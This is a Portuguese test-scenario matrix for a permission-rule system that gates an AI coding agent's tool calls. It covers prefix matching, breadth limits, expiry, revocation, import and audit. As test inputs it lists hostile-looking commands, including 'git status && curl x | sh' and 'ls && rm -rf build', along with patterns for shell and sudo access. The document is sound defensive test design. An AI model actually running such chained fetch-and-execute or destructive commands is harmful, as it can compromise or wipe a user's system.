# Plano 13 — Matriz de cenários

Exigida pelo [Estágio 0 do protocolo](../../architecture/shared/11-validation-protocol.md#estágio-0--plano-e-matriz-de-cenários).
**Escrita antes do código**, enumerada pelas seis dimensões.

Plano: [README.md](README.md) · Progresso: [progress.md](progress.md)

**Dimensões:** `eq` equivalência · `fron` fronteira · `err` erro · `est` transição de estado ·
`conc` concorrência · `idem` idempotência

**Estado:** ⬜ não escrito · 🟡 escrito, falhando · ✅ passando · ⛔ bloqueado

Os códigos marcados **(novo)** entram no catálogo pela [B-04](F0-contract.md#b-04--códigos-de-erro-novos-no-catálogo-e-nas-três-pontas-). Os
demais já existem no [catálogo](../../architecture/shared/04-errors-and-http.md#catálogo-de-erros-de-domínio).
Cenário marcado **regressão** prova que uma garantia do [plano 03](../03-rules-and-audit/README.md)
continua de pé depois deste plano — ele não é opcional nem "já coberto lá": o código que ele exercita
muda aqui.

---

## Contrato e documentos — B-01…B-07

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-01 | **regressão** — `GET /permission-rules` sem parâmetro devolve o que devolvia: ativas e expiradas, sem revogadas, mais novas primeiro — o app Flutter não muda | eq | integração | — | B-02 | ⬜ |
| S-02 | o mapper do app (`permission_rule_mapper.dart`) lê a listagem enriquecida sem quebrar: campo desconhecido é ignorado | eq | unit | — | B-02 | ⬜ |
| S-03 | todo código novo existe nas três fontes — doc 04, `error-catalogue.ts` e `messageKey` em en/pt-BR —, e o teste de paridade reprova a falta de qualquer um | err | unit | `PERMISSION_RULE_TOO_BROAD` (novo), `PERMISSION_RULE_STATE_CONFLICT` (novo), `PERMISSION_RULE_CHANGED` (novo), `PRECONDITION_REQUIRED` (novo), `PERMISSION_RULE_RESTORE_WINDOW_CLOSED` (novo), `PERMISSION_RULE_IMPORT_UNSUPPORTED` (novo), `PERMISSION_RULE_IMPORT_REJECTED` (novo) | B-04 | ⬜ |
| S-04 | `kind` novo de `audit_events` gravado sem a migration que o acrescenta ao `CHECK` é recusado pelo banco | err | integração | `INTERNAL_ERROR` | B-05 | ⬜ |
| S-05 | os `details` dos kinds novos carregam só ids, datas e contagens — nunca padrão de outra pessoa, input de tool nem conteúdo de arquivo | eq | integração | — | B-05 | ⬜ |
| S-06 | cada rota nova responde exatamente os status que o `backend/03` documenta para ela (teste de contrato por rota) | eq | integração | — | B-02, B-03 | ⬜ |
| S-223 | `web/03` e `backend/04` reescritos passam no `docs:check` com as âncoras que o código e as telas citam, e a seção Regras não repete linha nem contradiz o plano 03 | eq | unit | — | B-06, B-07 | ⬜ |

## O casamento e a largura do padrão — B-08

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-07 | `allow Bash(git status:*)` **não** responde `git status && curl x \| sh` — o pedido vai ao humano | eq | unit | — | B-08 | ✅ |
| S-08 | o mesmo para cada operador: `;`, `&&`, `\|\|`, `\|`, `&`, quebra de linha, crase, `$(`, `<(`, `>`, `>>`, `<` | fron | unit | — | B-08 | ✅ |
| S-09 | operador **entre aspas** (`git commit -m "a; b"`) também tira o comando do alcance do prefixo `allow` — falha fechada, pergunta a mais e nunca autorização a mais | fron | unit | — | B-08 | ✅ |
| S-10 | `deny Bash(rm:*)` recusa `ls && rm -rf build` — o `deny` casa **por segmento** | eq | unit | — | B-08 | ✅ |
| S-11 | `deny Bash(rm:*)` recusa `echo $(rm -rf x)` e `ls \| xargs rm` não — o segundo é declarado fora do alcance na ajuda, não prometido | fron | unit | — | B-08 | ✅ |
| S-12 | `allow` **exato** continua casando só a string idêntica, mesmo composta: `Bash(make && make test)` casa ela e nada mais | eq | unit | — | B-08 | ✅ |
| S-13 | **regressão** — `git status:*` não cobre `git statusx`; `Bash(git status)` não cobre `git push --force`; input sem campo casável não casa | eq | unit | — | B-08 | ⬜ |
| S-14 | `Read(/a/src:*)` não casa `/a/src/x.ts`: a fronteira de token é o espaço, e a análise devolve o achado `pathPrefix` explicando isso | fron | unit | — | B-08 | ⬜ |
| S-15 | largura por tabela: `Bash`, `Bash(sh:*)`, `Bash(bash -c:*)`, `Bash(env:*)`, `Bash(sudo:*)`, `Bash(xargs:*)`, `Bash(npx:*)`, `Bash(python3:*)` → `unbounded`; `Bash(git:*)`, `Write`, `mcp__srv__tool` → `broad`; `Bash(git status:*)`, `Bash(git status)` → `narrow` | eq | unit | — | B-08 | ⬜ |
| S-16 | prefixo cujo conteúdo traz um operador (`Bash(make &&:*)`) é `unbounded` — existe para encadear | fron | unit | — | B-08 | ⬜ |
| S-17 | espaço à frente, tabulação ou espaço repetido no padrão não alargam nada: leitura e largura são as mesmas do padrão aparado | fron | unit | — | B-08 | ⬜ |
| S-18 | contenção entre padrões: tool ⊇ prefixo ⊇ exato; prefixo contém prefixo só na fronteira de token; tools diferentes são disjuntas | eq | unit | — | B-08 | ⬜ |
| S-19 | **regressão** — precedência intacta: qualquer `deny` que case vence; em `plan`, nenhum `allow` responde e o `deny` ainda recusa | eq | unit | — | B-08 | ⬜ |
| S-20 | propriedade sobre comandos gerados: o `allow` novo casa um **subconjunto** do antigo e o `deny` novo um **superconjunto** — a mudança só anda na direção segura | eq | unit | — | B-08 | ✅ |
| S-21 | sessão viva com regra de prefixo antiga: depois da mudança, o comando composto pergunta e o simples continua respondido | est | integração | — | B-08 | ✅ |

## Criar uma regra com segurança — B-09

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-22 | regra `project` para uma pasta dentro de raiz do usuário → `201`, com o caminho na forma que a sessão carrega | eq | integração | — | B-09 | ⬜ |
| S-23 | pasta fora da allowlist → recusada; nada gravado, nada auditado | err | integração | `WORKSPACE_NOT_ALLOWED` | B-09 | ⬜ |
| S-24 | pasta numa raiz que existe e é de **outra pessoa** → recusada | err | integração | `FORBIDDEN` | B-09 | ⬜ |
| S-25 | pasta que não existe | err | integração | `WORKSPACE_NOT_FOUND` | B-09 | ⬜ |
| S-26 | caminho que é arquivo | err | integração | `WORKSPACE_NOT_A_DIRECTORY` | B-09 | ⬜ |
| S-27 | symlink dentro da raiz que aponta para fora dela | err | integração | `WORKSPACE_NOT_ALLOWED` | B-09 | ⬜ |
| S-28 | caminho relativo, ou com `..` que sai da raiz | err | integração | `WORKSPACE_NOT_ALLOWED` | B-09 | ⬜ |
| S-29 | regra criada como `/raiz/app/` alcança a sessão aberta em `/raiz/app` — a normalização é a mesma da sessão | fron | integração | — | B-09 | ⬜ |
| S-30 | regra de `/raiz/app` **não** alcança a sessão aberta em `/raiz/app/backend` ([D-10](decisions.md#d-10--project-alcança-as-subpastas)) | fron | integração | — | B-09 | ⬜ |
| S-31 | `allow` `unbounded` (`Bash`, `Bash(sh:*)`) é recusado por qualquer cliente, não só pela tela | err | integração | `PERMISSION_RULE_TOO_BROAD` (novo) | B-09 | ⬜ |
| S-32 | `allow` `broad` sem `acknowledgeBroad: true` é recusado com `params.breadth: broad`; com ele, `201` | fron | integração | `PERMISSION_RULE_TOO_BROAD` (novo) | B-09 | ⬜ |
| S-33 | `deny` `unbounded` (`Bash`, `WebFetch`) é aceito — bloquear largo nunca é menos seguro | eq | integração | — | B-09 | ⬜ |
| S-34 | **regressão** — o caminho do card (`permission.resolve` com `project`/`always`) não muda: padrão mais estreito, sem confirmação de largura, pasta da sessão | eq | integração | — | B-09 | ⬜ |
| S-35 | a origem é gravada: `approval` com o `requestId`, `request`, `import`, `restore`; regra anterior à migration lê "origem não registrada" | eq | integração | — | B-09 | ⬜ |
| S-36 | `templateId` que o catálogo não tem | err | integração | `INVALID_INPUT` | B-09 | ⬜ |
| S-37 | `deny` aceita validade até o teto próprio, `allow` só até o dele; um milissegundo acima de cada teto é recusado | fron | integração | `PERMISSION_RULE_EXPIRY_TOO_LONG` | B-09 | ⬜ |
| S-38 | o teto de `deny` no limite do código sobe o processo; um milissegundo acima **derruba o boot** ([configuração que falha fechada](../../architecture/shared/07-repository-layout.md#configuração-que-carrega-decisão-de-segurança-falha-fechada)) | fron | unit | — | B-09 | ⬜ |
| S-39 | **regressão** — a mesma regra concedida ao mesmo tempo pela tela e pelo card → uma linha, um evento na trilha | conc | integração | — | B-09 | ⬜ |
| S-40 | **regressão** — trilha indisponível na concessão → a regra criada é revogada e a chamada falha | err | integração | `INTERNAL_ERROR` | B-09 | ⬜ |
| S-41 | **regressão** — regra nascida da tela, da importação ou da restauração **nunca** sai em `updatedPermissions` ([D-09 do plano 03](../03-rules-and-audit/decisions.md#d-09--a-regra-nossa-é-a-única-autoridade)) | eq | unit | — | B-09 | ⬜ |

## Listar, filtrar, ordenar — B-10

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-42 | `status=active`, `expired`, `revoked` — revogada só vem quando pedida ([D-02](decisions.md#d-02--revogadas-somem-ou-ficam-consultáveis)) | eq | integração | — | B-10 | ⬜ |
| S-43 | `expiresBefore`: a regra que expira **exatamente** no limite fica de fora (comparação estrita) | fron | integração | — | B-10 | ⬜ |
| S-44 | `scope`, `decision`, `tool` e `folder` combinados devolvem a interseção | eq | integração | — | B-10 | ⬜ |
| S-45 | a busca `q` é literal: `%`, `_` e `\` não viram curinga | fron | integração | — | B-10 | ⬜ |
| S-46 | `q` casa padrão **e** pasta, sem diferenciar caixa | eq | integração | — | B-10 | ⬜ |
| S-47 | cada ordenação (`grantedAt`, `expiresAt`, `lastUsedAt`, `useCount`, `pattern`) é estável, com desempate por `id` | eq | integração | — | B-10 | ⬜ |
| S-48 | filtro ou ordenação desconhecidos, data fora de ISO 8601 | err | integração | `INVALID_INPUT` | B-10 | ⬜ |
| S-49 | nenhum filtro traz regra de outra pessoa — nem `folder` apontando para a pasta de uma regra alheia | eq | integração | — | B-10 | ⬜ |
| S-50 | acima do teto da listagem, `truncated: true` e as mais novas primeiro ([D-13](decisions.md#d-13--a-listagem-pagina)) | fron | integração | — | B-10 | ⬜ |
| S-51 | cada item traz alcance estruturado, largura, achados, uso, origem, `etag` e `folderReachable` | eq | integração | — | B-10 | ⬜ |
| S-52 | a pasta da regra sai da allowlist → a regra continua listada, `folderReachable: false`, achado `unreachable` | est | integração | — | B-10 | ⬜ |
| S-53 | o resumo (`/summary`) conta o mesmo que a listagem devolve para os mesmos filtros | eq | integração | — | B-10 | ⬜ |
| S-54 | o plano de execução da listagem usa o índice, verificado como no [plano 03 · F2](../03-rules-and-audit/F2-audit-query.md) | fron | integração | — | B-10 | ⬜ |

## Uso, invocações e história da regra — B-11

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-55 | `useCount` conta só as entradas de **decisão** com aquele `rule_id`, do chamador, dentro da janela de retenção | eq | integração | — | B-11 | ⬜ |
| S-56 | entrada exatamente no início da janela entra; um milissegundo antes não | fron | integração | — | B-11 | ⬜ |
| S-57 | regra nunca usada → `useCount: 0`, `lastUsedAt: null` | fron | integração | — | B-11 | ⬜ |
| S-58 | entrada de outro usuário com o mesmo `rule_id` (forjada no banco) não conta — a consulta é escopada por usuário, não só por regra | eq | integração | — | B-11 | ⬜ |
| S-59 | as invocações da regra paginam por keyset descendente; escrita durante a leitura não repete nem pula linha | conc | integração | — | B-11 | ⬜ |
| S-60 | invocações ou história de regra alheia; de regra inexistente | err | integração | `PERMISSION_NOT_OWNED`, `PERMISSION_RULE_NOT_FOUND` | B-11 | ⬜ |
| S-61 | invocação de `Read` sai só com `file_path`, `offset`, `limit` e `pages`, como a trilha | eq | integração | — | B-11 | ⬜ |
| S-62 | `GET /audit-entries?ruleId=` devolve **as mesmas** N linhas que o `useCount` diz — o número da tela e a trilha nunca divergem | eq | integração | — | B-11 | ⬜ |
| S-63 | a história da regra (concedida, validade mudada, revogada, restaurada) traz só eventos do chamador, em ordem | eq | integração | — | B-11 | ⬜ |
| S-64 | o uso de mil regras sai numa consulta agrupada que usa o índice parcial novo, sem varrer a trilha | fron | integração | — | B-11 | ⬜ |

## Validade — B-12

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-65 | encurtar uma regra ativa → `200`, `ETag` novo, evento `permission.ruleExpiryChanged` com antes e depois | eq | integração | — | B-12 | ⬜ |
| S-66 | estender até agora + teto → `200`; um milissegundo acima → recusado ([D-14](decisions.md#d-14--o-teto-da-extensão-conta-de-quando)) | fron | integração | `PERMISSION_RULE_EXPIRY_TOO_LONG` | B-12 | ⬜ |
| S-67 | nova validade no passado ou agora — encerrar já é revogar | err | integração | `INVALID_INPUT` | B-12 | ⬜ |
| S-68 | `PATCH` sem `If-Match` | err | integração | `PRECONDITION_REQUIRED` (novo) | B-12 | ⬜ |
| S-69 | `If-Match` de uma versão que não é mais a atual | err | integração | `PERMISSION_RULE_CHANGED` (novo) | B-12 | ⬜ |
| S-70 | regra revogada ou expirada não muda de validade — nunca é ressuscitada por um `PATCH` | est | integração | `PERMISSION_RULE_STATE_CONFLICT` (novo) | B-12 | ⬜ |
| S-71 | regra alheia (continua como estava); regra inexistente | err | integração | `PERMISSION_NOT_OWNED`, `PERMISSION_RULE_NOT_FOUND` | B-12 | ⬜ |
| S-72 | a ordem das recusas é fixa: inexistente → alheia → sem `If-Match` → estado → versão → validade | eq | unit | — | B-12 | ⬜ |
| S-73 | a mesma validade enviada de novo → `200`, **nenhum** evento novo | idem | integração | — | B-12 | ⬜ |
| S-74 | estender e revogar ao mesmo tempo → a regra termina revogada; o `PATCH` recebe `409` ou `412`; nenhuma extensão registrada depois da revogação | conc | integração | `PERMISSION_RULE_STATE_CONFLICT` (novo), `PERMISSION_RULE_CHANGED` (novo) | B-12 | ⬜ |
| S-75 | dois `PATCH` com o mesmo `ETag` → um `200`, o outro `412`; um evento | conc | integração | `PERMISSION_RULE_CHANGED` (novo) | B-12 | ⬜ |
| S-76 | **regressão** — encurtada para daqui a instantes, a regra deixa de responder na **próxima** invocação da sessão viva, sem cache | est | integração | — | B-12 | ⬜ |
| S-77 | trilha indisponível: a extensão volta à validade anterior e falha; o encurtamento fica (direção segura) e falha | err | integração | `INTERNAL_ERROR` | B-12 | ⬜ |
| S-78 | estender apaga a marca de lembrete, e o lembrete volta a valer para a validade nova | est | integração | — | B-12 | ⬜ |
| S-79 | corpo com `pattern`, `scope` ou `decision` — só validade se edita ([D-01](decisions.md#d-01--o-que-se-edita-numa-regra)) | err | integração | `INVALID_INPUT` | B-12 | ⬜ |

## Revogar em lote e desfazer — B-13

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-80 | três regras próprias revogadas numa instrução; três `permission.ruleRevoked` com o mesmo `batchId` | eq | integração | — | B-13 | ⬜ |
| S-81 | o lote tem um id de outra pessoa → nada é revogado | err | integração | `PERMISSION_NOT_OWNED` | B-13 | ⬜ |
| S-82 | o lote tem um id que não existe → nada é revogado | err | integração | `PERMISSION_RULE_NOT_FOUND` | B-13 | ⬜ |
| S-83 | itens já revogados contam como sucesso e não geram evento | idem | integração | — | B-13 | ⬜ |
| S-84 | 100 ids passam; 101, lista vazia ou id repetido além do teto são recusados; repetido dentro do teto conta uma vez | fron | integração | `INVALID_INPUT` | B-13 | ⬜ |
| S-85 | lote e `DELETE` avulso na mesma regra, ao mesmo tempo → uma revogação, um evento | conc | integração | — | B-13 | ⬜ |
| S-86 | **regressão** — depois do lote, a próxima invocação de cada sessão viva pergunta de novo | est | integração | — | B-13 | ⬜ |
| S-87 | restaurar dentro da janela → regra nova com os mesmos campos, origem `restore` e `restoredFrom`, evento de concessão | eq | integração | — | B-13 | ⬜ |
| S-88 | restaurar depois da janela ([D-11](decisions.md#d-11--desfazer-a-revogação)) | fron | integração | `PERMISSION_RULE_RESTORE_WINDOW_CLOSED` (novo) | B-13 | ⬜ |
| S-89 | restaurar regra que não está revogada | err | integração | `PERMISSION_RULE_STATE_CONFLICT` (novo) | B-13 | ⬜ |
| S-90 | restaurar `allow` antigo que hoje é `unbounded`, ou cuja validade passa do teto atual — a restauração é concessão e passa pela mesma rotina | err | integração | `PERMISSION_RULE_TOO_BROAD` (novo), `PERMISSION_RULE_EXPIRY_TOO_LONG` | B-13 | ⬜ |
| S-91 | restaurar duas vezes (clique duplo, ou duas abas) → uma regra | idem | integração | — | B-13 | ⬜ |
| S-92 | a validade original já passou enquanto a regra estava revogada → não há o que restaurar | est | integração | `PERMISSION_RULE_STATE_CONFLICT` (novo) | B-13 | ⬜ |
| S-93 | restaurar regra revogada de outra pessoa | err | integração | `PERMISSION_NOT_OWNED` | B-13 | ⬜ |

## Testar um comando — B-14

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-94 | `allow` que casa → `outcome: allow`, a regra que responde e todas as que casam | eq | integração | — | B-14 | ⬜ |
| S-95 | `deny` e `allow` casando → `deny`, com o motivo "deny vence" e as duas listadas | eq | integração | — | B-14 | ⬜ |
| S-96 | **regressão** — modo `plan` com `allow` que casa → `ask`, motivo `planMode`; com `deny`, `deny` | est | integração | — | B-14 | ⬜ |
| S-97 | nenhuma regra casa → `ask` | eq | integração | — | B-14 | ⬜ |
| S-98 | regra de outra pessoa que casaria o mesmo comando **não aparece e não muda** o resultado | eq | integração | — | B-14 | ⬜ |
| S-99 | pasta fora da allowlist; raiz de outra pessoa | err | integração | `WORKSPACE_NOT_ALLOWED`, `FORBIDDEN` | B-14 | ⬜ |
| S-100 | sem pasta, só as regras `always` contam — como um pedido sem projeto | fron | integração | — | B-14 | ⬜ |
| S-101 | regra expirada ou revogada nunca responde no teste | est | integração | — | B-14 | ⬜ |
| S-102 | nenhum efeito colateral: nem entrada na trilha, nem `permission_requests`, nem uso, nem push, nem evento WS | idem | integração | — | B-14 | ⬜ |
| S-103 | o mesmo teste repetido dá o mesmo resultado | idem | integração | — | B-14 | ⬜ |
| S-104 | rascunho `allow` coberto por um `deny` existente → `deny`, e o rascunho recebe o achado `shadowedByDeny` | eq | integração | — | B-14 | ⬜ |
| S-105 | nome de tool fora da gramática, comando acima de 4096 caracteres, modo desconhecido | err | integração | `INVALID_INPUT` | B-14 | ⬜ |
| S-106 | a resposta sempre traz as ressalvas: o CLI decide antes de nós no `deny` do projeto, no `acceptEdits` e nas tools que ele aprova sozinho | eq | unit | — | B-14 | ⬜ |
| S-107 | o log de I/O do teste não carrega o comando — só tool, tamanho e resultado | eq | integração | — | B-14 | ⬜ |
| S-108 | `sessionId` de sessão viva do chamador acrescenta as regras `session` e o modo atual; de sessão alheia, recusado | err | integração | `FORBIDDEN` | B-14 | ⬜ |
| S-109 | teste concorrente com uma revogação → o resultado é o de antes ou o de depois, e nunca uma regra revogada depois do commit | conc | integração | — | B-14 | ⬜ |

## Redundância, sobreposição e conflito — B-15

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-110 | rascunho idêntico a uma regra ativa → achado `identical`, apontando para ela | eq | unit | — | B-15 | ⬜ |
| S-111 | `allow Bash(git status)` ao lado de `allow Bash(git status:*)` no mesmo escopo ou mais largo → `redundant`, com a regra que cobre | eq | unit | — | B-15 | ⬜ |
| S-112 | `allow` inteiramente coberto por um `deny` → `shadowedByDeny` ("nunca responde"); parcialmente → `overlapsDeny` com o trecho | eq | unit | — | B-15 | ⬜ |
| S-113 | regra `project` coberta por uma `always` de mesma decisão → `redundant`, explicando qual vale onde | eq | unit | — | B-15 | ⬜ |
| S-114 | regras `project` em pastas diferentes nunca se sobrepõem — o casamento de pasta é exato | fron | unit | — | B-15 | ⬜ |
| S-115 | regra expirada ou revogada não gera achado contra as ativas | est | unit | — | B-15 | ⬜ |
| S-116 | regra antiga `unbounded` ou `broad` recebe o achado `tooBroad` — ela continua valendo, e a tela diz o quanto | eq | unit | — | B-15 | ⬜ |
| S-117 | prefixo em tool de caminho recebe `pathPrefix` ([D-08](decisions.md#d-08--prefixo-em-tool-de-caminho)) | eq | unit | — | B-15 | ⬜ |
| S-118 | a prévia de um rascunho com padrão fora da gramática | err | integração | `PERMISSION_RULE_PATTERN_INVALID` | B-15 | ⬜ |
| S-119 | nenhum achado cita regra de outra pessoa | eq | integração | — | B-15 | ⬜ |
| S-120 | a mesma entrada dá os mesmos achados, na mesma ordem | idem | unit | — | B-15 | ⬜ |

## Simular contra a trilha — B-16

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-121 | rascunho `allow`: as invocações que foram perguntadas e que ele teria respondido saem como `wouldAutoAllow`, listadas | eq | integração | — | B-16 | ⬜ |
| S-122 | remover a regra X: as invocações que X respondeu saem como `wouldAsk` | eq | integração | — | B-16 | ⬜ |
| S-123 | rascunho `deny` sobre invocações aprovadas por humano → `wouldDeny` | eq | integração | — | B-16 | ⬜ |
| S-124 | só entram as invocações que chegaram ao `canUseTool` — a `recorded` que o CLI aprovou sozinho não é contada como "teria sido perguntada" | eq | integração | — | B-16 | ⬜ |
| S-125 | invocação de sessão sem pasta registrada: rascunho `project` não a alcança, e ela é contada em `withoutFolder` | fron | integração | — | B-16 | ⬜ |
| S-126 | `limit` 1, o default e o teto passam; teto + 1 é recusado ([D-15](decisions.md#d-15--quantas-invocações-a-simulação-lê-e-o-que-ela-conta)) | fron | integração | `INVALID_INPUT` | B-16 | ⬜ |
| S-127 | a simulação só lê a trilha do chamador | eq | integração | — | B-16 | ⬜ |
| S-128 | nenhum efeito colateral, e repetir dá o mesmo resultado enquanto a trilha não muda | idem | integração | — | B-16 | ⬜ |
| S-129 | a simulação usa a mesma precedência da sessão viva (`answeringRule`), não uma cópia | eq | unit | — | B-16 | ⬜ |
| S-130 | mais de 10 rascunhos, ou mais de 100 regras removidas | fron | integração | `INVALID_INPUT` | B-16 | ⬜ |
| S-131 | remover um id de regra de outra pessoa | err | integração | `PERMISSION_NOT_OWNED` | B-16 | ⬜ |
| S-132 | item de `Read` na simulação sai com os campos que a trilha deixa sair | eq | integração | — | B-16 | ⬜ |

## Modelos de regra — B-17

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-133 | todo modelo do catálogo passa na gramática e na largura — um modelo com `allow` `unbounded` reprova o teste do catálogo | err | unit | `PERMISSION_RULE_TOO_BROAD` (novo) | B-17 | ⬜ |
| S-134 | nome e descrição de cada modelo são chaves presentes em en e pt-BR | eq | unit | — | B-17 | ⬜ |
| S-135 | aplicar um modelo passa pela prévia e pela aplicação da importação: mesmas validações, origem `import` com o `templateId` | eq | integração | — | B-17 | ⬜ |

## Exportar e importar — B-18

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-136 | a exportação traz `format` e `version`, nenhum id e nenhum `userId`, em ordem determinística, respeitando os filtros | eq | integração | — | B-18 | ⬜ |
| S-137 | exportar grava `permission.rulesExported` com a contagem | eq | integração | — | B-18 | ⬜ |
| S-138 | a prévia da importação dá um veredito por item — `new`, `existing` ou `invalid` com o código | eq | integração | — | B-18 | ⬜ |
| S-139 | arquivo com `userId`, `grantedBy` ou `id` de outra pessoa: os campos são ignorados, e toda regra nasce do chamador | eq | integração | — | B-18 | ⬜ |
| S-140 | `format` ou `version` desconhecidos; JSON malformado | err | integração | `PERMISSION_RULE_IMPORT_UNSUPPORTED` (novo), `INVALID_INPUT` | B-18 | ⬜ |
| S-141 | acima de 500 regras ou de 256 KB | fron | integração | `PAYLOAD_TOO_LARGE` | B-18 | ⬜ |
| S-142 | um item aceito ficou inválido entre a prévia e a aplicação (a pasta saiu da allowlist) → nada é criado, e o detalhe diz qual e por quê | err | integração | `PERMISSION_RULE_IMPORT_REJECTED` (novo) | B-18 | ⬜ |
| S-143 | `digest` que não é o do arquivo enviado | err | integração | `INVALID_INPUT` | B-18 | ⬜ |
| S-144 | `folderMap` troca a pasta de outra máquina por uma daqui, e o destino é validado como numa criação | eq | integração | — | B-18 | ⬜ |
| S-145 | importar o mesmo arquivo duas vezes → a segunda não cria nada nem registra concessão; o resumo diz `created: 0` | idem | integração | — | B-18 | ⬜ |
| S-146 | duas importações do mesmo arquivo ao mesmo tempo → cada regra uma vez | conc | integração | — | B-18 | ⬜ |
| S-147 | item `broad` exige confirmação por índice; `allow` `unbounded` é sempre inválido | fron | integração | `PERMISSION_RULE_TOO_BROAD` (novo) | B-18 | ⬜ |
| S-148 | a validade do arquivo é ignorada: o lote ganha a default ou a escolhida, e acima do teto é recusado | fron | integração | `PERMISSION_RULE_EXPIRY_TOO_LONG` | B-18 | ⬜ |
| S-149 | falha de escrita no meio do lote: o que já nasceu fica, auditado; a resposta é erro, e a listagem mostra exatamente o que nasceu | err | integração | `INTERNAL_ERROR` | B-18 | ⬜ |

## Lembrete de expiração — B-19

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-150 | quem optou recebe **um** resumo por push com as regras que expiram em até sete dias; a execução seguinte não repete | idem | integração | — | B-19 | ⬜ |
| S-151 | o push carrega só a contagem e o link para `/rules` filtrado — nunca padrão nem pasta, porque o push atravessa terceiros | eq | integração | — | B-19 | ⬜ |
| S-152 | quem não optou não recebe nada | eq | integração | — | B-19 | ⬜ |
| S-153 | regra que expira exatamente em sete dias entra; em sete dias e um milissegundo, não | fron | integração | — | B-19 | ⬜ |
| S-154 | push que falha não marca a regra como lembrada, e a próxima execução tenta de novo | est | integração | — | B-19 | ⬜ |
| S-155 | duas execuções do job ao mesmo tempo → um resumo, sob advisory lock | conc | integração | — | B-19 | ⬜ |

## Service e hooks da tela — B-20

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-156 | os filtros moram na search da URL: recarregar reproduz a tela; valor inválido na search cai no default campo a campo | eq | integração | — | B-20 | ⬜ |
| S-157 | o hook guarda o `ETag` e manda `If-Match`; o `412` recarrega a regra e diz que ela mudou | err | integração | `PERMISSION_RULE_CHANGED` (novo) | B-20 | ⬜ |
| S-158 | filtro novo descarta a resposta que ainda chegava do anterior | conc | integração | — | B-20 | ⬜ |

## A tela e o detalhe — B-21, B-22

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-159 | os quatro estados: skeleton com a forma da tabela, erro com recuperação, vazio que ensina o próximo passo em cada aba, conteúdo | eq | integração | — | B-21 | ⬜ |
| S-160 | as abas mostram as contagens do resumo; "Perto de expirar" usa os sete dias do [plano 03 · D-13](../03-rules-and-audit/decisions.md#d-13--perto-de-expirar-é-sete-dias) | fron | integração | — | B-21 | ⬜ |
| S-161 | a tabela mostra decisão, tool por nome amigável, padrão em mono, onde vale, validade, uso, última vez e criação | eq | integração | — | B-21 | ⬜ |
| S-162 | tool desconhecida ou MCP ganha o nome genérico com o nome técnico ao lado | fron | integração | — | B-21 | ⬜ |
| S-163 | a frase do detalhe para cada forma (tool, exato, prefixo) × escopo × decisão, nos dois idiomas | eq | unit | — | B-22 | ⬜ |
| S-164 | o detalhe mostra cada achado com link para a regra envolvida, e o alerta de pasta que não é mais alcançável | eq | integração | — | B-22 | ⬜ |
| S-165 | as últimas invocações levam à trilha filtrada pela regra | eq | integração | — | B-22 | ⬜ |
| S-166 | regra revogada no detalhe: estado e data, e só as ações que fazem sentido — duplicar, e restaurar enquanto a janela está aberta | est | integração | — | B-22 | ⬜ |
| S-167 | abaixo de `md` a tabela vira lista de cartões; sem scroll horizontal; alvo de toque de 44 px | fron | integração | — | B-21 | ⬜ |
| S-168 | teclado: setas movem, Espaço seleciona, Enter abre o detalhe, Esc fecha | eq | integração | — | B-21 | ⬜ |

## Validade pela tela — B-23

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-169 | estender mostra o teto, os atalhos de prazo e um segundo passo com a data nova e o alcance; voltar não envia nada | est | integração | — | B-23 | ⬜ |
| S-170 | encurtar é direto, com "desfazer" no aviso; desfazer manda a validade anterior | est | integração | — | B-23 | ⬜ |
| S-171 | `412` no diálogo → mensagem traduzida e recarga, nunca sobrescrita silenciosa | err | integração | `PERMISSION_RULE_CHANGED` (novo) | B-23 | ⬜ |
| S-172 | a regra foi revogada noutra tela enquanto o diálogo estava aberto → a linha passa a revogada, com a mensagem traduzida | err | integração | `PERMISSION_RULE_STATE_CONFLICT` (novo) | B-23 | ⬜ |

## Seleção e ações em lote — B-24

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-173 | selecionar várias → barra de lote; revogar mostra a prévia (quantas, quais padrões) e, feito, "desfazer" restaura | est | integração | — | B-24 | ⬜ |
| S-174 | clique duplo na confirmação revoga uma vez | idem | integração | — | B-24 | ⬜ |
| S-175 | lote recusado mantém todas as linhas, com o erro traduzido | err | integração | `PERMISSION_NOT_OWNED` | B-24 | ⬜ |
| S-176 | menu de contexto e comandos da paleta existem e agem sobre a seleção | eq | integração | — | B-24 | ⬜ |
| S-177 | "selecionar tudo" pega só o que o filtro atual mostra | fron | integração | — | B-24 | ⬜ |

## Lembrete na web — B-25

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-178 | o selo na navegação mostra quantas expiram em sete dias; zero esconde o selo | fron | integração | — | B-25 | ⬜ |
| S-179 | a entrada na central de notificações leva à aba filtrada | eq | integração | — | B-25 | ⬜ |
| S-180 | a preferência do resumo por push é gravada e lida de volta | eq | integração | — | B-25 | ⬜ |

## Usabilidade e ajuda da tela — B-26

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
